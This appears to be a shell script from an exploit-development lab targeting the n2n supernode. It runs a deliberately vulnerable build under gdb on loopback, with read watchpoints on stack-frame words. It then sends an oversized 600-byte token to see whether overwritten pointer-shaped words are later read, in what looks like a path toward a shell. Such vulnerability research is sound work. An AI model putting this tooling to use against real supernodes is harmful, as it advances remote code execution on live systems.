#!/bin/sh
# W7: do hardware read watchpoints fire on pointer-shaped process_udp frame
# words that a LARGER wire token actually overwrites? W5 watched the same
# words with token_size=96, which stops at nak+109 and never touches them.
# Loopback only; plain pinned vulnerable supernode, no peer (no forwarding
# memcpy that would read them as mere data).
set -u
HERE=$(cd "$(dirname "$0")" || exit 1; pwd)
N2N=$(cd "$HERE/.." || exit 1; pwd)
PLAIN=$N2N/provision/build/n2n-plain
EVID=$HERE/evidence
PORT_BASE=${PORT_BASE:-18600}
TOKEN=${TOKEN:-600}
WORK=${TMPDIR:-/tmp}/n2n2shell-w7.$$
mkdir -p "$WORK" || exit 1
trap 'rm -rf "$WORK"' EXIT HUP INT TERM

run_batch() {
    label=$1 port=$2; shift 2
    cmd=$WORK/gdb-$label.txt
    {
        echo 'set pagination off'
        echo 'set confirm off'
        echo 'break sn_utils.c:2331'
        echo "run -f -p 127.0.0.1:$port -t $((port+1)) -c community.list -F labfed -M"
        for off in "$@"; do
            echo "rwatch -l *(unsigned long *)((char *)&nak + $off)"
        done
        echo 'printf "W7_AFTER_DECODE\\n"'
        for off in "$@"; do
            echo "x/gx (unsigned long *)((char *)&nak + $off)"
        done
        echo 'continue'
        echo 'printf "W7_RWATCH_HIT\\n"'
        echo 'bt 8'
        echo 'info registers rip'
        echo 'kill'
        echo 'quit'
    } >"$cmd"
    (cd "$PLAIN" && timeout 22 gdb -q -batch -x "$cmd" ./supernode) \
        >"$EVID/w7-$label.log" 2>&1 &
    gdb_pid=$!
    sleep 5
    python3 "$HERE/send_big_nak.py" "$port" "$TOKEN" \
        >"$EVID/w7-$label-sender.log" 2>&1
    wait "$gdb_pid" 2>/dev/null || true
    printf '%s: ' "$label"
    if grep -q W7_RWATCH_HIT "$EVID/w7-$label.log"; then
        echo RWATCH_HIT
    else
        echo no-read-in-22s
    fi
}

run_batch a "$PORT_BASE" 128 136 344 432
run_batch b "$((PORT_BASE+10))" 368 400 424 464
echo "W7 done; token_size=$TOKEN logs in $EVID/w7-*.log"
